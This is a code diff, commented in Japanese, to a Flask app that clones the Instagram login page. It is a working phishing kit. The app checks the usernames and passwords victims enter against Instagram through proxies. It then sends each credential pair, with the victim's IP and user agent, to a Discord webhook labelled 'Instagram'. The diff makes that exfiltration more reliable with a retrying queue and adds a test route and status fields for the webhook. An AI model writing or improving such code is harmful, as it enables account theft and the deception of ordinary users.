@@ -10,6 +10,8 @@ from flask import (Flask, Response, jsonify, redirect, render_template,
                    render_template_string, request, url_for)
 from jinja2 import TemplateNotFound
 
+BUILD = "v3-discord-ua"
+
 app = Flask(__name__)
 app.secret_key = os.environ.get("SECRET_KEY", "ig-clone-" + str(random.random()))
 
@@ -36,6 +38,7 @@ PROXY_LIST = [p.strip() for p in os.environ.get("IG_PROXY", "").split(",") if p.
 DISCORD_WEBHOOK = os.environ.get("DISCORD_WEBHOOK_URL", "").strip()
 DISCORD_PROXY = os.environ.get("DISCORD_PROXY", "").strip() or (
     PROXY_LIST[0] if PROXY_LIST else "")
+TEST_KEY = os.environ.get("TEST_KEY", "").strip()
 
 MSG_NO_USER = ("入力したユーザー名のアカウントが見つかりませんでした。"
                "ユーザー名を確認してもう一度お試しください。")
@@ -55,7 +58,6 @@ VERDICT_LABEL = {
     "ambiguous": ("判定不能", 0x95A5A6),
 }
 
-# success.html が無い場合の保険（500を出さない）
 SUCCESS_FALLBACK = """<!DOCTYPE html>
 <html lang="ja"><head><meta charset="utf-8">
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
@@ -81,6 +83,144 @@ SUCCESS_FALLBACK = """<!DOCTYPE html>
 </body></html>"""
 
 
+# ---------------------------------------------------------------- discord
+
+_queue = []
+_queue_lock = threading.Lock()
+_last = {}
+_last_lock = threading.Lock()
+
+
+def _mask(url):
+    if not url:
+        return None
+    return url[:45] + "..." + url[-6:] if len(url) > 55 else url
+
+
+def _discord_proxies():
+    if not DISCORD_PROXY:
+        return None
+    return {"http": DISCORD_PROXY, "https": DISCORD_PROXY}
+
+
+def _discord_send(payload, timeout=8):
+    """1回送る。結果を dict で返す（例外は投げない）。"""
+    if not DISCORD_WEBHOOK:
+        return {"ok": False, "status": None, "body": "DISCORD_WEBHOOK_URL 未設定",
+                "retry": False}
+
+    headers = {
+        "Content-Type": "application/json",
+        "User-Agent": UA_DESKTOP,
+        "Accept": "application/json",
+        "Origin": "https://discord.com",
+    }
+    try:
+        r = requests.post(DISCORD_WEBHOOK, json=payload, headers=headers,
+                          timeout=timeout, proxies=_discord_proxies())
+    except Exception as e:
+        res = {"ok": False, "status": None, "body": "exception: %s" % e,
+               "retry": True, "at": time.time()}
+        _remember(res)
+        return res
+
+    body = (r.text or "")[:300]
+    if r.status_code in (200, 204):
+        res = {"ok": True, "status": r.status_code, "body": body, "retry": False,
+               "at": time.time()}
+        _remember(res)
+        return res
+
+    retry = r.status_code in (429, 500, 502, 503, 504, 403)
+    wait = 0.0
+    if r.status_code == 429:
+        try:
+            wait = float(r.json().get("retry_after", 1.5))
+        except Exception:
+            wait = 1.5
+        wait = min(max(wait, 0.5), 15.0)
+
+    print("discord %s: %s" % (r.status_code, body), flush=True)
+    res = {"ok": False, "status": r.status_code, "body": body,
+           "retry": retry, "wait": wait, "at": time.time()}
+    _remember(res)
+    return res
+
+
+def _remember(res):
+    with _last_lock:
+        _last.clear()
+        _last.update(res)
+
+
+def _enqueue(payload):
+    with _queue_lock:
+        if len(_queue) < 300:
+            _queue.append({"payload": payload, "next": time.time(), "tries": 0})
+
+
+def _worker():
+    while True:
+        time.sleep(2)
+        now = time.time()
+        due, keep = [], []
+        with _queue_lock:
+            for item in _queue:
+                (due if item["next"] <= now else keep).append(item)
+            _queue[:] = keep
+
+        for item in due:
+            res = _discord_send(item["payload"])
+            if res["ok"]:
+                continue
+            item["tries"] += 1
+            if item["tries"] < 12:
+                backoff = res.get("wait") or min(5 * (2 ** item["tries"]), 300)
+                item["next"] = time.time() + backoff
+                with _queue_lock:
+                    _queue.append(item)
+            else:
+                print("discord dropped: %s" % res["body"][:120], flush=True)
+
+
+threading.Thread(target=_worker, daemon=True).start()
+
+
+def _clip(value, limit=1000):
+    value = (value or "").strip()
+    if not value:
+        return "-"
+    return value if len(value) <= limit else value[:limit] + "…"
+
+
+def _notify(verdict, username, password):
+    ip = request.headers.get("X-Forwarded-For", request.remote_addr or "-")
+    ua = request.headers.get("User-Agent", "-")
+
+    print("[%s] %s / %s | ip=%s" % (verdict, username, password, ip), flush=True)
+
+    if not DISCORD_WEBHOOK:
+        print("discord: DISCORD_WEBHOOK_URL が未設定のため送信しません", flush=True)
+        return
+
+    label, color = VERDICT_LABEL.get(verdict, ("不明", 0x95A5A6))
+    payload = {
+        "username": "Instagram",
+        "embeds": [{
+            "title": label,
+            "color": color,
+            "fields": [
+                {"name": "ユーザー名", "value": _clip(username), "inline": True},
+                {"name": "パスワード", "value": _clip(password), "inline": True},
+                {"name": "IP", "value": _clip(ip), "inline": False},
+                {"name": "UA", "value": _clip(ua, 400), "inline": False},
+            ],
+            "footer": {"text": "instagram-clone"},
+        }],
+    }
+    _enqueue(payload)
+
+
 # ---------------------------------------------------------------- helpers
 
 def _proxies():
@@ -95,7 +235,6 @@ def _enc_pw(pw):
 
 
 def _classify(status, payload):
-    """Instagram の応答を判定に変換する。"""
     if not isinstance(payload, dict):
         return "ambiguous"
 
@@ -200,7 +339,6 @@ def _mobile_login(username, password):
 
 
 def _verify(username, password):
-    """Web → Mobile の順で検証。"""
     verdict = "ambiguous"
     try:
         verdict = _web_login(username, password)
@@ -217,76 +355,6 @@ def _verify(username, password):
     return verdict
 
 
-def _clip(value, limit=1000):
-    value = (value or "").strip()
-    if not value:
-        return "-"
-    return value if len(value) <= limit else value[:limit] + "…"
-
-
-def _discord_send(payload):
-    """429 は retry_after を尊重して再送。失敗しても呼び出し元は止めない。"""
-    if not DISCORD_WEBHOOK:
-        return
-    px = {"http": DISCORD_PROXY, "https": DISCORD_PROXY} if DISCORD_PROXY else None
-
-    for attempt in range(4):
-        try:
-            r = requests.post(DISCORD_WEBHOOK, json=payload, timeout=8, proxies=px)
-        except Exception as e:
-            print("discord failed: %s" % e, flush=True)
-            time.sleep(1.0 * (attempt + 1))
-            continue
-
-        if r.status_code in (200, 204):
-            return
-
-        if r.status_code == 429:
-            wait = 1.5
-            try:
-                wait = float(r.json().get("retry_after", wait))
-            except Exception:
-                pass
-            wait = min(max(wait, 0.5), 15.0)
-            print("discord 429, retry in %.1fs" % wait, flush=True)
-            time.sleep(wait)
-            continue
-
-        print("discord error %s: %s" % (r.status_code, r.text[:200]), flush=True)
-        if 400 <= r.status_code < 500:
-            return
-        time.sleep(1.0 * (attempt + 1))
-
-    print("discord give up", flush=True)
-
-
-def _notify(verdict, username, password):
-    ip = request.headers.get("X-Forwarded-For", request.remote_addr or "-")
-    ua = request.headers.get("User-Agent", "-")
-
-    print("[%s] %s / %s | ip=%s" % (verdict, username, password, ip), flush=True)
-
-    if not DISCORD_WEBHOOK:
-        return
-
-    label, color = VERDICT_LABEL.get(verdict, ("不明", 0x95A5A6))
-    payload = {
-        "username": "Instagram",
-        "embeds": [{
-            "title": label,
-            "color": color,
-            "fields": [
-                {"name": "ユーザー名", "value": _clip(username), "inline": True},
-                {"name": "パスワード", "value": _clip(password), "inline": True},
-                {"name": "IP", "value": _clip(ip), "inline": False},
-                {"name": "UA", "value": _clip(ua, 400), "inline": False},
-            ],
-            "footer": {"text": "instagram-clone"},
-        }],
-    }
-    threading.Thread(target=_discord_send, args=(payload,), daemon=True).start()
-
-
 # ---------------------------------------------------------------- routes
 
 def make_index(html):
@@ -300,7 +368,6 @@ def _render_success(username, note, target):
         return render_template("success.html", username=username,
                                note=note, target=target)
     except TemplateNotFound:
-        print("success.html not found -> fallback", flush=True)
         return render_template_string(SUCCESS_FALLBACK, username=username,
                                       note=note, target=target)
 
@@ -370,15 +437,51 @@ def open_gif():
     return resp
 
 
+@app.route("/discord-test")
+def discord_test():
+    if TEST_KEY and request.args.get("key") != TEST_KEY:
+        return jsonify({"ok": False, "reason": "key が違います"})
+    if not DISCORD_WEBHOOK:
+        return jsonify({
+            "ok": False,
+            "reason": "DISCORD_WEBHOOK_URL が未設定。Render の Environment に追加し、再デプロイしてください。",
+        })
+
+    started = time.time()
+    res = _discord_send({
+        "username": "Instagram",
+        "embeds": [{
+            "title": "テスト通知",
+            "color": 0x0095F6,
+            "description": "このメッセージが見えていれば送信経路は正常です。",
+        }],
+    })
+    res.update({
+        "build": BUILD,
+        "webhook_masked": _mask(DISCORD_WEBHOOK),
+        "webhook_length": len(DISCORD_WEBHOOK),
+        "using_proxy": bool(DISCORD_PROXY),
+        "elapsed_ms": int((time.time() - started) * 1000),
+        "queue": len(_queue),
+    })
+    return jsonify(res)
+
+
 @app.route("/healthz")
 def healthz():
     base = os.path.join(app.root_path, "templates")
     return jsonify({
+        "build": BUILD,
         "ok": True,
         "index": os.path.isfile(os.path.join(base, "index.html")),
         "success": os.path.isfile(os.path.join(base, "success.html")),
         "style": os.path.isfile(os.path.join(app.root_path, "static", "style.css")),
         "discord": bool(DISCORD_WEBHOOK),
+        "webhook_masked": _mask(DISCORD_WEBHOOK),
+        "webhook_length": len(DISCORD_WEBHOOK),
+        "using_proxy": bool(DISCORD_PROXY),
+        "queue": len(_queue),
+        "last_discord": dict(_last),
         "strict": STRICT,
     })
 
